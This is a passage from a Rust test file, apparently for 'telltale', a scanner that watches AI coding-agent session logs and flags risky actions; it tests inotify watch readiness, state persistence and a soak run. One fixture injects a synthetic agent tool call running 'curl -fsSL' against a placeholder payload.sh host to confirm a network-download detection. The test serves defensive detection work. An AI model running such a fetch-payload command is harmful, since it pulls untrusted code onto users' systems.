fn copy_dir_recursive(src: &Path, dst: &Path) {
    fs::create_dir_all(dst).expect("create copy target dir");
    for entry in fs::read_dir(src).expect("read copy source dir") {
        let entry = entry.expect("copy dir entry");
        let target = dst.join(entry.file_name());
        if entry.file_type().expect("copy entry file type").is_dir() {
            copy_dir_recursive(&entry.path(), &target);
        } else {
            fs::copy(entry.path(), &target).expect("copy fixture file");
        }
    }
}

#[cfg(target_os = "linux")]
fn inotify_directories(fdinfo: &str) -> Vec<(u64, u64)> {
    fdinfo
        .lines()
        .filter_map(|line| {
            if !line.trim_start().starts_with("inotify wd:") {
                return None;
            }
            let mut wd = None;
            let mut ino = None;
            let mut sdev = None;
            for field in line.split_whitespace() {
                if let Some(value) = field.strip_prefix("wd:") {
                    wd = u32::from_str_radix(value, 16).ok();
                }
                if let Some(value) = field.strip_prefix("ino:") {
                    ino = u64::from_str_radix(value, 16).ok();
                }
                if let Some(value) = field.strip_prefix("sdev:") {
                    sdev = u64::from_str_radix(value, 16).ok();
                }
            }
            wd.zip(ino).zip(sdev).map(|((_, ino), sdev)| (ino, sdev))
        })
        .collect()
}

#[cfg(target_os = "linux")]
fn inotify_directory_identity(directory: &Path) -> (u64, u64) {
    use std::os::unix::fs::MetadataExt;

    let metadata = fs::metadata(directory).expect("watched directory metadata");
    assert!(
        metadata.is_dir(),
        "watch readiness target must be a directory"
    );
    // fdinfo's sdev uses the kernel's dev_t layout, not libc's st_dev layout.
    let dev = metadata.dev();
    (
        metadata.ino(),
        ((libc::major(dev) as u64) << 20) | libc::minor(dev) as u64,
    )
}

#[cfg(target_os = "linux")]
fn observed_inotify_directories(pid: u32) -> Result<Vec<(u64, u64)>, String> {
    let mut observed = Vec::new();
    for entry in fs::read_dir(format!("/proc/{pid}/fd")).map_err(|error| error.to_string())? {
        let entry = entry.map_err(|error| error.to_string())?;
        match fs::read_link(entry.path()) {
            Ok(target) if target.to_string_lossy().contains("inotify") => {
                let path = format!("/proc/{pid}/fdinfo/{}", entry.file_name().to_string_lossy());
                match fs::read_to_string(path) {
                    Ok(info) => observed.extend(inotify_directories(&info)),
                    Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                    Err(error) => return Err(error.to_string()),
                }
            }
            Ok(_) => {}
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
            Err(error) => return Err(error.to_string()),
        }
    }
    Ok(observed)
}

fn fail_watch(child: &mut std::process::Child, reason: &str) -> ! {
    if child.try_wait().ok().flatten().is_none() {
        let _ = child.kill();
    }
    let _ = child.wait();
    let stdout = child.stdout.take().map(|mut pipe| {
        let mut bytes = Vec::new();
        pipe.read_to_end(&mut bytes).expect("read watch stdout");
        String::from_utf8_lossy(&bytes).into_owned()
    });
    let stderr = child.stderr.take().map(|mut pipe| {
        let mut bytes = Vec::new();
        pipe.read_to_end(&mut bytes).expect("read watch stderr");
        String::from_utf8_lossy(&bytes).into_owned()
    });
    panic!("{reason}; child stdout: {stdout:?}; child stderr: {stderr:?}");
}

#[cfg(target_os = "linux")]
fn wait_for_watch_ready(child: &mut std::process::Child, directory: &Path) {
    let expected = inotify_directory_identity(directory);
    let deadline = Instant::now() + Duration::from_secs(20);
    loop {
        if let Some(status) = child.try_wait().expect("poll watch readiness") {
            fail_watch(
                child,
                &format!(
                    "watch exited before directory registration: {status:?}; expected {expected:x?}"
                ),
            );
        }
        let observed = observed_inotify_directories(child.id()).unwrap_or_else(|error| {
            fail_watch(child, &format!("cannot inspect inotify watches: {error}"))
        });
        if observed.contains(&expected) {
            return;
        }
        if Instant::now() >= deadline {
            fail_watch(
                child,
                &format!(
                    "watch did not register target directory; expected {expected:x?}, observed {observed:x?}"
                ),
            );
        }
        thread::sleep(Duration::from_millis(20));
    }
}

#[cfg(not(target_os = "linux"))]
fn wait_for_watch_ready(_child: &mut std::process::Child, _directory: &Path) {
    thread::sleep(Duration::from_secs(2));
}

#[cfg(unix)]
fn is_sigterm_watch_summary(line: &str) -> bool {
    serde_json::from_str::<Value>(line).is_ok_and(|summary| {
        summary["event_type"] == "health"
            && summary["source_processing"]["parsed_record_count"]
                .as_u64()
                .is_some_and(|count| count >= 3)
    })
}

#[cfg(unix)]
fn append_sigterm_watch_trigger(session: &Path, attempt: u32) -> std::io::Result<()> {
    let mut file = fs::OpenOptions::new().append(true).open(session)?;
    writeln!(
        file,
        "{{\"type\":\"event_msg\",\"timestamp\":\"2026-04-01T00:00:02Z\",\"payload\":{{\"type\":\"user_message\",\"message\":\"synthetic SIGTERM watch trigger {attempt}\"}}}}"
    )
}

#[cfg(target_os = "linux")]
#[test]
fn watch_readiness_matches_whole_inotify_record_and_device() {
    let info = "inotify wd:1 ino:abc sdev:fc00000 mask:2\n\
                inotify wd:2 ino:def sdev:fc00000 mask:2\n\
                inotify wd:3 ino:abc sdev:fb00000 mask:2\n\
                inotify wd:4 ino:bad sdev:invalid mask:2\n\
                inotify wd:5 ino:invalid sdev:fc00000 mask:2\n\
                inotify wd:6 ino:abc mask:2\n\
                inotify wd:7 sdev:fc00000 mask:2\n\
                inotify wd:invalid ino:abc sdev:fc00000 mask:2";
    let watched = inotify_directories(info);
    assert!(watched.contains(&(0xabc, 0xfc00000)));
    assert!(!watched.contains(&(0xdef, 0xfb00000)));
    assert!(!watched.contains(&(0xabc, 0xfd00000)));
    assert_eq!(watched.len(), 3);
    assert!(
        !inotify_directories("inotify wd:1 ino:abc sdev:fb00000").contains(&(0xabc, 0xfc00000))
    );
    assert!(
        !inotify_directories("inotify wd:1 ino:def sdev:fc00000").contains(&(0xabc, 0xfc00000))
    );
    assert!(inotify_directories("inotify wd:1 ino:abc\ninotify wd:2 sdev:fc00000").is_empty());
}

#[cfg(target_os = "linux")]
#[test]
fn watch_readiness_waits_for_nested_directory_registration() {
    use std::os::fd::FromRawFd;
    use std::os::unix::ffi::OsStrExt;

    let temp = tempdir().expect("tempdir");
    let ancestor = temp.path().join("codex");
    let target = ancestor.join("sessions/2026/04");
    fs::create_dir_all(&target).expect("create nested fixture directory");
    let fd = unsafe { libc::inotify_init1(libc::IN_CLOEXEC) };
    assert!(
        fd >= 0,
        "create inotify: {}",
        std::io::Error::last_os_error()
    );
    let fd = unsafe { std::os::fd::OwnedFd::from_raw_fd(fd) };
    let register = |directory: &Path| {
        let name =
            std::ffi::CString::new(directory.as_os_str().as_bytes()).expect("path without NUL");
        let wd = unsafe {
            libc::inotify_add_watch(
                std::os::fd::AsRawFd::as_raw_fd(&fd),
                name.as_ptr(),
                libc::IN_MODIFY,
            )
        };
        assert!(
            wd >= 0,
            "register directory: {}",
            std::io::Error::last_os_error()
        );
    };
    register(&ancestor);
    let expected = inotify_directory_identity(&target);
    let ancestor_only =
        observed_inotify_directories(std::process::id()).expect("inspect ancestor watch");
    assert!(!ancestor_only.is_empty());
    assert!(!ancestor_only.contains(&expected));
    register(&target);
    let with_target =
        observed_inotify_directories(std::process::id()).expect("inspect target watch");
    assert!(
        with_target.contains(&expected),
        "expected {expected:x?}, observed {with_target:x?}"
    );
}

#[cfg(unix)]
#[test]
fn watch_sigterm_readiness_requires_completed_source_scan() {
    assert!(!is_sigterm_watch_summary("not JSON"));
    assert!(!is_sigterm_watch_summary(
        r#"{"event_type":"activity","source_processing":{"parsed_record_count":3}}"#
    ));
    assert!(!is_sigterm_watch_summary(
        r#"{"event_type":"health","source_processing":{"parsed_record_count":2}}"#
    ));
    assert!(is_sigterm_watch_summary(
        r#"{"event_type":"health","source_processing":{"parsed_record_count":3}}"#
    ));
}

#[cfg(unix)]
#[test]
fn watch_sigterm_trigger_appends_complete_synthetic_records() {
    let temp = tempdir().expect("tempdir");
    let session = temp.path().join("session.jsonl");
    fs::copy(
        "tests/fixtures/session_stores/codex/sessions/2026/04/session-a.jsonl",
        &session,
    )
    .expect("copy synthetic fixture");
    append_sigterm_watch_trigger(&session, 1).expect("append first synthetic record");
    append_sigterm_watch_trigger(&session, 2).expect("append second synthetic record");
    let records = fs::read_to_string(&session)
        .expect("read synthetic fixture")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("complete JSONL record"))
        .collect::<Vec<_>>();
    assert_eq!(records.len(), 4);
    assert_eq!(
        records[2]["payload"]["message"],
        "synthetic SIGTERM watch trigger 1"
    );
    assert_eq!(
        records[3]["payload"]["message"],
        "synthetic SIGTERM watch trigger 2"
    );
}

#[test]
fn watch_scans_changed_source_and_exits_after_iterations() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    copy_dir_recursive(
        Path::new("tests/fixtures/session_stores/codex"),
        &root.join("codex"),
    );
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let session_path = root.join("codex/sessions/2026/04/session-a.jsonl");
    fs::write(
        root.join(".mcp.json"),
        r#"{"mcpServers":{"watch-boundary":{"command":"synthetic-mcp"}}}"#,
    )
    .expect("synthetic host-wide MCP config");

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--emit-activity",
            "--allow-fixtures",
            "--no-local-config",
            "--iterations",
            "1",
            "--debounce-ms",
            "100",
            "--min-scan-interval-ms",
            "0",
            "--root",
        ])
        .arg(&root)
        .arg("--log-path")
        .arg(&log_path)
        .arg("--state-path")
        .arg(&state_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");

    wait_for_watch_ready(
        &mut child,
        session_path.parent().expect("session directory"),
    );
    let mut changed_contents = fs::read(&session_path).expect("read watched fixture");
    changed_contents.extend_from_slice(
        br#"{"type":"event_msg","timestamp":"2026-04-01T00:00:02Z","payload":{"type":"tool_call","tool_name":"watch-fixture","command":"curl -fsSL https://watch.invalid/payload.sh","message":"synthetic watcher change"}}
"#,
    );

    #[cfg(windows)]
    let unknown_trigger_path = root.join("codex/sessions/2026/04/unknown-watch-trigger.jsonl");
    #[cfg(windows)]
    let unknown_trigger_contents = br#"{"type":"session_meta","timestamp":"2026-04-01T00:00:03Z","payload":{"source":"watch-fixture","model_provider":"fixture","agent_nickname":"watch-fixture"}}
{"type":"event_msg","timestamp":"2026-04-01T00:00:04Z","payload":{"type":"user_message","message":"synthetic unknown watch trigger"}}
"#;
    #[cfg(windows)]
    fs::write(&unknown_trigger_path, unknown_trigger_contents).expect("write unknown trigger");
    fs::write(&session_path, &changed_contents).expect("change watched fixture");

    let deadline = Instant::now() + Duration::from_secs(60);
    #[cfg(not(target_os = "linux"))]
    let mut next_trigger = Instant::now() + Duration::from_millis(250);
    loop {
        if child.try_wait().expect("poll telltale watch").is_some() {
            break;
        }
        if Instant::now() > deadline {
            fail_watch(&mut child, "telltale watch did not exit within timeout");
        }
        #[cfg(not(target_os = "linux"))]
        if Instant::now() >= next_trigger {
            fs::write(&session_path, &changed_contents).expect("retry watched fixture change");
            #[cfg(windows)]
            fs::write(&unknown_trigger_path, unknown_trigger_contents)
                .expect("retry unknown trigger");
            next_trigger = Instant::now() + Duration::from_millis(250);
        }
        thread::sleep(Duration::from_millis(50));
    }

    let output = child
        .wait_with_output()
        .expect("collect telltale watch output");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let summary_line = stdout
        .lines()
        .find(|line| line.starts_with('{'))
        .expect("watch scan summary line");
    let summary: Value = serde_json::from_str(summary_line).expect("scan summary json");
    assert_eq!(summary["event_type"], "health");
    assert_runtime_snapshot(&summary);
    assert!(
        summary["source_processing"]["parsed_record_count"]
            .as_u64()
            .expect("parsed record count")
            >= 3
    );
    let events = fs::read_to_string(&log_path)
        .expect("watch event log")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("watch event json"))
        .collect::<Vec<_>>();
    assert!(
        events
            .iter()
            .any(|event| { event["event_type"] == "activity" && event["client"] == "codex" })
    );
    let has_mcp_inventory = events.iter().any(|event| {
        event["session_id"] == "mcp_inventory" && event["tool_name"] == "mcp::watch-boundary"
    });
    // The Windows trigger forces a full scan; other platforms target the
    // known changed source and must not walk host-wide MCP configuration.
    assert_eq!(has_mcp_inventory, cfg!(windows));
    let changed_detection = events
        .iter()
        .find(|event| {
            event["event_type"] == "detection"
                && event["rule_ids"]
                    .as_array()
                    .expect("rule ids")
                    .iter()
                    .any(|rule| rule == "network.download")
        })
        .expect("network.download detection");
    assert!(
        changed_detection["source_path_hash"].as_str().is_some_and(
            |hash| hash.len() == 64 && hash.bytes().all(|byte| byte.is_ascii_hexdigit())
        )
    );
    #[cfg(not(windows))]
    assert_eq!(
        summary["source_discovery"]["basis"],
        "watch_source_index_snapshot"
    );
    #[cfg(not(windows))]
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        false
    );
    #[cfg(windows)]
    assert_eq!(summary["source_discovery"]["basis"], "current_full_scan");
    #[cfg(windows)]
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert!(
        summary["source_discovery"]["operational_source_count"]
            .as_u64()
            .unwrap()
            >= summary["source_processing"]["selected_source_count"]
                .as_u64()
                .unwrap()
    );
    assert_eq!(
        summary["effective_configuration"]["local_config"]["mode"],
        "disabled"
    );
    assert!(
        log_path.exists(),
        "watch scan should write events to the log path"
    );
    assert!(
        state_path.exists(),
        "watch scan should persist scanner state"
    );
}

#[test]
fn watch_skips_no_op_state_save() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    let session_dir = root.join("codex/sessions/2026/04");
    fs::create_dir_all(&session_dir).expect("create Codex session directory");
    fs::copy(
        "tests/fixtures/session_stores/codex/sessions/2026/04/session-a.jsonl",
        session_dir.join("session-a.jsonl"),
    )
    .expect("copy Codex session fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--allow-fixtures",
            "--no-local-config",
            "--iterations",
            "2",
            "--debounce-ms",
            "100",
            "--min-scan-interval-ms",
            "0",
            "--root",
        ])
        .arg(&root)
        .arg("--log-path")
        .arg(&log_path)
        .arg("--state-path")
        .arg(&state_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");
    let stdout = child.stdout.take().expect("watch stdout");
    let (summary_tx, summary_rx) = mpsc::channel();
    thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if summary_tx.send(line).is_err() {
                break;
            }
        }
    });

    // Allow the watcher to finish initialization, then issue exactly one
    // unrelated change. An unknown path forces a full reconciliation, and
    // waiting for its summary prevents that first trigger from accidentally
    // satisfying the second iteration.
    wait_for_watch_ready(&mut child, &root.join("codex/sessions"));
    let first_trigger = root.join("codex/sessions/first-trigger.txt");
    #[cfg(target_os = "linux")]
    let first_attempt = 1;
    #[cfg(not(target_os = "linux"))]
    let mut first_attempt = 1;
    fs::write(
        &first_trigger,
        format!("watch first trigger {first_attempt}\n"),
    )
    .expect("write first trigger");
    #[cfg(not(target_os = "linux"))]
    let mut next_retry = Instant::now() + Duration::from_secs(5);
    let first_deadline = Instant::now() + Duration::from_secs(60);
    let first_summary = loop {
        match summary_rx.recv_timeout(Duration::from_millis(100)) {
            Ok(line) => break line,
            Err(mpsc::RecvTimeoutError::Timeout) => {}
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                panic!("watch summary reader disconnected before first scan completed")
            }
        }
        if let Some(status) = child.try_wait().expect("poll telltale watch") {
            panic!("telltale watch exited before first scan completed: {status:?}");
        }
        if Instant::now() >= first_deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("telltale watch did not complete the first triggered scan within timeout");
        }
        #[cfg(not(target_os = "linux"))]
        if Instant::now() >= next_retry {
            first_attempt += 1;
            fs::write(
                &first_trigger,
                format!("watch first trigger {first_attempt}\n"),
            )
            .expect("retry first trigger");
            next_retry = Instant::now() + Duration::from_secs(5);
        }
    };

    let state_before = fs::read(&state_path).expect("read first state snapshot");
    let mtime_before = fs::metadata(&state_path)
        .expect("state metadata")
        .modified()
        .expect("state mtime");

    // Trigger a full reconciliation with an unrelated path. No new records
    // means no emitted events and no durable state changes, so the state-save
    // should be skipped.
    let noop_trigger = root.join("codex/sessions/noop-trigger.txt");
    fs::write(&noop_trigger, b"watch test trigger\n").expect("write no-op trigger");

    // Wait for the second iteration to finish and the process to exit.
    let deadline = Instant::now() + Duration::from_secs(60);
    loop {
        if child.try_wait().expect("poll telltale watch").is_some() {
            break;
        }
        if Instant::now() > deadline {
            let _ = child.kill();
            let _ = child.wait();
            panic!("telltale watch did not exit after second scan within timeout");
        }
        thread::sleep(Duration::from_millis(100));
    }

    let output = child
        .wait_with_output()
        .expect("collect telltale watch output");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let mut summaries =
        vec![serde_json::from_str::<Value>(&first_summary).expect("first watch summary json")];
    summaries.extend(
        summary_rx
            .iter()
            .map(|line| serde_json::from_str::<Value>(&line).expect("watch summary json")),
    );
    assert_eq!(summaries.len(), 2);
    assert_runtime_snapshot(&summaries[0]);
    assert_eq!(summaries[0]["runtime"], summaries[1]["runtime"]);
    assert_eq!(
        summaries[0]["effective_configuration"],
        summaries[1]["effective_configuration"]
    );
    assert_eq!(
        summaries[0]["source_discovery"]["basis"],
        "current_full_scan"
    );
    assert_eq!(
        summaries[0]["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert_eq!(
        summaries[1]["source_discovery"]["basis"],
        "current_full_scan"
    );

    let state_after = fs::read(&state_path).expect("read second state snapshot");
    let mtime_after = fs::metadata(&state_path)
        .expect("state metadata")
        .modified()
        .expect("state mtime");
    assert_eq!(
        state_before, state_after,
        "no-op watch scan should not rewrite state bytes"
    );
    assert_eq!(
        mtime_before, mtime_after,
        "no-op watch scan should not rewrite state file"
    );
}

#[cfg(target_os = "linux")]
struct WatchChildGuard {
    child: Option<std::process::Child>,
}

#[cfg(target_os = "linux")]
impl WatchChildGuard {
    fn new(child: std::process::Child) -> Self {
        Self { child: Some(child) }
    }

    fn id(&self) -> u32 {
        self.child.as_ref().expect("watch child guard").id()
    }

    fn child_mut(&mut self) -> &mut std::process::Child {
        self.child.as_mut().expect("watch child guard")
    }

    fn disarm(mut self) -> std::process::Child {
        self.child.take().expect("watch child guard")
    }
}

#[cfg(target_os = "linux")]
impl Drop for WatchChildGuard {
    fn drop(&mut self) {
        if let Some(child) = self.child.as_mut() {
            if child.try_wait().ok().flatten().is_none() {
                let _ = child.kill();
            }
            let _ = child.wait();
        }
    }
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "Phase 4 synthetic watch soak; run explicitly on Linux"]
fn watch_synthetic_multi_cycle_soak() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).expect("codex sessions dir");
    let malformed_path = sessions.join("malformed-source.jsonl");
    fs::copy(
        Path::new("tests/fixtures/rule_samples/malformed-source.jsonl"),
        &malformed_path,
    )
    .expect("copy malformed fixture");
    let valid_later_path = sessions.join("uc001-positive.jsonl");
    let valid_later = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
    );
    let valid_second_path = sessions.join("uc001-positive-server-instructions.jsonl");
    let valid_second = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive-server-instructions.jsonl"
    );
    let valid_third_path = sessions.join("uc001-positive-tool-description.jsonl");
    let valid_third = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive-tool-description.jsonl"
    );
    for path in [&valid_later_path, &valid_second_path, &valid_third_path] {
        fs::write(path, b"").expect("pre-create valid source");
    }

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let mut child = WatchChildGuard::new(
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "watch",
                "--allow-fixtures",
                "--no-local-config",
                "--client",
                "codex",
                "--iterations",
                "6",
                "--debounce-ms",
                "100",
                "--min-scan-interval-ms",
                "0",
                "--install-inventory-disabled",
                "--log-rotate-max-size",
                "1",
                "--log-rotate-keep",
                "2",
                "--root",
            ])
            .arg(&root)
            .arg("--log-path")
            .arg(&log_path)
            .arg("--state-path")
            .arg(&state_path)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn telltale watch soak"),
    );

    let (summary_tx, summary_rx) = mpsc::channel();
    let stdout = child.child_mut().stdout.take().expect("watch stdout");
    let stdout_reader = thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if summary_tx.send(line).is_err() {
                break;
            }
        }
    });
    let pid = child.id();
    let proc_fd_path = format!("/proc/{pid}/fd");
    let proc_fdinfo_path = format!("/proc/{pid}/fdinfo");
    if !Path::new("/proc").is_dir()
        || fs::read_dir("/proc/self/fd").is_err()
        || !Path::new(&proc_fd_path).is_dir()
        || !Path::new(&proc_fdinfo_path).is_dir()
    {
        panic!("Linux procfs prerequisite unavailable for watch readiness: /proc/<pid>/fd");
    }
    let readiness_deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let mut has_inotify_watch = false;
        for entry in fs::read_dir(&proc_fd_path)
            .expect("Linux procfs prerequisite unavailable while reading child fds")
        {
            let entry = entry.expect("Linux procfs prerequisite unavailable while reading fd");
            match fs::read_link(entry.path()) {
                Ok(target) if target.to_string_lossy().contains("inotify") => {
                    let Some(fd) = entry.file_name().to_string_lossy().parse::<u32>().ok() else {
                        continue;
                    };
                    let fdinfo = match fs::read_to_string(format!("{proc_fdinfo_path}/{fd}")) {
                        Ok(fdinfo) => fdinfo,
                        Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                        Err(error) => panic!(
                            "Linux procfs prerequisite unavailable while reading inotify fdinfo: {error}"
                        ),
                    };
                    if fdinfo
                        .lines()
                        .any(|line| line.trim_start().starts_with("inotify wd:"))
                    {
                        has_inotify_watch = true;
                        break;
                    }
                }
                Ok(_) => {}
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                Err(error) => {
                    panic!("Linux procfs prerequisite unavailable while reading fd target: {error}")
                }
            }
        }
        if has_inotify_watch {
            break;
        }
        if Instant::now() >= readiness_deadline {
            let _ = child.child_mut().kill();
            let _ = child.child_mut().wait();
            panic!(
                "Linux inotify readiness prerequisite unavailable: no inotify fdinfo contained an inotify wd: line"
            );
        }
        thread::sleep(Duration::from_millis(20));
    }
    let fd_count = || {
        let mut count = 0;
        for entry in fs::read_dir(&proc_fd_path).expect("read child file descriptors") {
            entry.expect("read child file descriptor");
            count += 1;
        }
        count
    };

    let wait_for_next_scan = |child: &mut std::process::Child,
                              path: &Path,
                              contents: &[u8],
                              allow_exit_during_quiet: bool| {
        match summary_rx.try_recv() {
            Ok(_) => panic!("unexpected extra watch summary before single-cycle write"),
            Err(mpsc::TryRecvError::Disconnected) => {
                panic!("watch summary reader disconnected before single-cycle write")
            }
            Err(mpsc::TryRecvError::Empty) => {}
        }
        fs::write(path, contents).expect("trigger exactly one watch event");
        let deadline = Instant::now() + Duration::from_secs(20);
        let summary = loop {
            match summary_rx.recv_timeout(Duration::from_millis(20)) {
                Ok(line) => break serde_json::from_str::<Value>(&line).expect("summary json"),
                Err(mpsc::RecvTimeoutError::Timeout) => {}
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    panic!("watch summary reader disconnected before scan completed")
                }
            }
            if let Some(status) = child.try_wait().expect("poll telltale watch") {
                panic!("telltale watch exited before scan completed: {status:?}")
            }
            if Instant::now() >= deadline {
                let _ = child.kill();
                let _ = child.wait();
                panic!("telltale watch did not complete the single triggered scan within timeout")
            }
        };
        let quiet_deadline = Instant::now() + Duration::from_millis(150);
        while Instant::now() < quiet_deadline {
            let remaining = quiet_deadline.saturating_duration_since(Instant::now());
            match summary_rx.recv_timeout(remaining.min(Duration::from_millis(20))) {
                Ok(_) => panic!("extra watch summary followed a single-cycle write"),
                Err(mpsc::RecvTimeoutError::Timeout) => {}
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    if !allow_exit_during_quiet {
                        panic!("watch summary reader disconnected during quiet period")
                    }
                    thread::sleep(remaining);
                    break;
                }
            }
            if child
                .try_wait()
                .expect("poll telltale watch quiet period")
                .is_some()
                && !allow_exit_during_quiet
            {
                panic!("telltale watch exited unexpectedly during quiet period")
            }
        }
        summary
    };
    let telemetry_paths = || {
        fs::read_dir(temp.path())
            .expect("read telemetry directory")
            .map(|entry| entry.expect("telemetry entry").path())
            .filter(|path| {
                path.file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(|name| {
                        name == "telltale-events.jsonl"
                            || (name.starts_with("telltale-events-") && name.ends_with(".jsonl"))
                    })
            })
            .collect::<Vec<_>>()
    };
    let rotated_paths = || {
        telemetry_paths()
            .into_iter()
            .filter(|path| path != &log_path)
            .collect::<Vec<_>>()
    };
    let read_events = || {
        telemetry_paths()
            .iter()
            .flat_map(|path| {
                fs::read_to_string(path)
                    .expect("read telemetry file")
                    .lines()
                    .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
                    .collect::<Vec<_>>()
            })
            .collect::<Vec<_>>()
    };
    let assert_detection = |session_id: &str| {
        assert!(
            read_events().iter().any(|event| {
                event["event_type"] == "detection" && event["session_id"] == session_id
            }),
            "expected detection for {session_id} after its scan"
        );
    };
    let malformed = fs::read(&malformed_path).expect("read malformed fixture");
    let mut summaries = Vec::new();
    summaries.push(wait_for_next_scan(
        child.child_mut(),
        &malformed_path,
        &malformed,
        false,
    ));
    assert_eq!(summaries[0]["event_type"], "health");
    assert_eq!(summaries[0]["detection_count"], 1);
    assert_eq!(summaries[0]["emitted_count"], 1);
    assert_eq!(summaries[0]["delivery"]["status"], "delivered");
    let first_events = fs::read_to_string(&log_path).expect("first telemetry");
    assert!(first_events.lines().any(|line| {
        serde_json::from_str::<Value>(line).expect("first event json")["event_type"]
            == "scanner_error"
    }));
    let fd_baseline = fd_count();
    let mut fd_counts: Vec<usize> = vec![fd_baseline];

    let read_state = || {
        let bytes = fs::read(&state_path).expect("scanner state");
        let state = serde_json::from_slice::<Value>(&bytes).expect("scanner state json");
        (state, bytes.len())
    };
    let (first_state, first_state_bytes) = read_state();
    let first_state_mtime = fs::metadata(&state_path)
        .expect("first state metadata")
        .modified()
        .expect("first state mtime");

    let run_noop = |child: &mut std::process::Child,
                    path: &Path,
                    contents: &[u8],
                    prior_state: &Value,
                    prior_mtime: std::time::SystemTime| {
        thread::sleep(Duration::from_millis(2_100));
        let summary = wait_for_next_scan(child, path, contents, false);
        let fd_sample = fd_count();
        let (state, bytes) = read_state();
        let mtime = fs::metadata(&state_path)
            .expect("no-op state metadata")
            .modified()
            .expect("no-op state mtime");
        assert_eq!(&state, prior_state);
        assert_eq!(mtime, prior_mtime);
        assert_eq!(summary["event_type"], "health");
        assert_eq!(summary["detection_count"], 1);
        assert_eq!(summary["emitted_count"], 0);
        assert_eq!(summary["delivery"]["status"], "delivered");
        (summary, state, bytes, mtime, fd_sample)
    };

    let (second_summary, second_state, second_state_bytes, _, second_fd) = run_noop(
        child.child_mut(),
        &malformed_path,
        &malformed,
        &first_state,
        first_state_mtime,
    );
    summaries.push(second_summary);
    fd_counts.push(second_fd);

    let valid_summary =
        wait_for_next_scan(child.child_mut(), &valid_later_path, valid_later, false);
    assert_eq!(valid_summary["emitted_count"], 1);
    summaries.push(valid_summary);
    assert_detection("uc001-positive");
    fd_counts.push(fd_count());
    let (state_after_valid, valid_state_bytes) = read_state();
    let valid_state_mtime = fs::metadata(&state_path)
        .expect("valid state metadata")
        .modified()
        .expect("valid state mtime");
    assert_ne!(state_after_valid, second_state);
    let first_rotated_paths = rotated_paths();
    assert_eq!(first_rotated_paths.len(), 1);
    let oldest_rotated_path = first_rotated_paths
        .into_iter()
        .next()
        .expect("first rotated path");

    let (no_op_summary, _state_after_noop, no_op_state_bytes, _, no_op_fd) = run_noop(
        child.child_mut(),
        &valid_later_path,
        valid_later,
        &state_after_valid,
        valid_state_mtime,
    );
    summaries.push(no_op_summary);
    fd_counts.push(no_op_fd);

    let followup_sources: [(&Path, &[u8], &str, bool); 2] = [
        (
            &valid_second_path,
            valid_second,
            "uc001-positive-server-instructions",
            false,
        ),
        (
            &valid_third_path,
            valid_third,
            "uc001-positive-tool-description",
            true,
        ),
    ];
    let mut scanner_errors_before_pruning = 0;
    for (index, (path, contents, session_id, terminal)) in followup_sources.into_iter().enumerate()
    {
        let summary = wait_for_next_scan(child.child_mut(), path, contents, terminal);
        assert_eq!(summary["emitted_count"], 1);
        summaries.push(summary);
        assert_detection(session_id);
        if index == 0 {
            fd_counts.push(fd_count());
            scanner_errors_before_pruning = read_events()
                .iter()
                .filter(|event| event["event_type"] == "scanner_error")
                .count();
            assert_eq!(scanner_errors_before_pruning, 1);
        }
    }

    let exit_deadline = Instant::now() + Duration::from_secs(20);
    let final_status = loop {
        if let Some(status) = child
            .child_mut()
            .try_wait()
            .expect("poll final telltale watch")
        {
            break status;
        }
        if Instant::now() >= exit_deadline {
            let _ = child.child_mut().kill();
            let _ = child.child_mut().wait();
            panic!("telltale watch did not exit after finite soak iterations")
        }
        thread::sleep(Duration::from_millis(20));
    };
    assert!(
        final_status.success(),
        "watch soak failed: {final_status:?}"
    );
    let exited_child = child.disarm();
    let output = exited_child
        .wait_with_output()
        .expect("collect telltale watch output");
    stdout_reader.join().expect("join watch summary reader");
    assert!(!Path::new(&proc_fd_path).exists());

    assert_eq!(summaries.len(), 6, "every triggered scan must complete");
    assert!(
